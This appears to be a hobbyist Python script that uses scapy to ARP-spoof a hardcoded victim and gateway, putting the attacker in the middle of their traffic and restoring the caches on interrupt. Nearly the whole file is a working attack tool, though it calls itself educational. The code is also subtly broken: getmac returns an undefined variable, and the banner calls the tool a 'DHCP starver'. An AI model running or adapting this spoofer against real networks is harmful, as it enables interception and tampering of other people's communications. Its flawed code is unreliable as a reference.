from scapy.all import *
import sys
import os
import time

from scapy.layers.l2 import ARP, Ether


class ARPspoofer(object):
    def __init__(self):
        self.ip_victim = '10.0.0.209'
        self.ip_gateway = '10.0.0.1'

    def getmac(self, ip_destination):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt /= ARP(op=1, pdst=ip_destination)

        ans = srp(pkt, timeout=2, verbose=False)[0][0][1].hwsrc
        return mac_target


    def spoof_arp_cache(self, ip_destination, mac_destination, ip_source):
        print(f'\r [*]Sending spoof Package towards {ip_destination}', end='')
        pkt = ARP(op=2, pdst=ip_destination, psrc=ip_source, hwdst=mac_destination)
        send(pkt, verbose=False)

    def restore_arp_cache(self, ip_destination, mac_source, ip_source, ):
        pkt = ARP(op=2, pdst=ip_destination, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_source, hwsrc=mac_source)
        send(pkt, verbose=False)

    def spoofing(self):
        print('Welcome to the homemade DHCP starver \n'
              'This Program is created for learning purposes \n'
              'Created by: Marc Hoogendoorn \n'
            )


        try:
            mac_victim = self.getmac(self.ip_victim)
        except IndexError:
            sys.exit('\n [!] Mac address of the victim could not be reached')
        try:
            mac_gateway = self.getmac(self.ip_gateway)
        except IndexError:
            sys.exit('\n [!] Mac address of the gateway could not be reached')

        while True:
            try:
                self.spoof_arp_cache(self.ip_victim, mac_victim, self.ip_gateway)
                self.spoof_arp_cache(self.ip_gateway, mac_gateway, self.ip_victim)
                time.sleep(1.5)

            except KeyboardInterrupt:
                print('\n [*] Reversing the spoof')
                self.restore_arp_cache(self.ip_victim, mac_gateway, self.ip_gateway)
                self.restore_arp_cache(self.ip_gateway, mac_victim, self.ip_victim)
                sys.exit('\n [!]Exciting the Program ')


if __name__ == '__main__':
    tool = ARPspoofer()
    tool.spoofing()
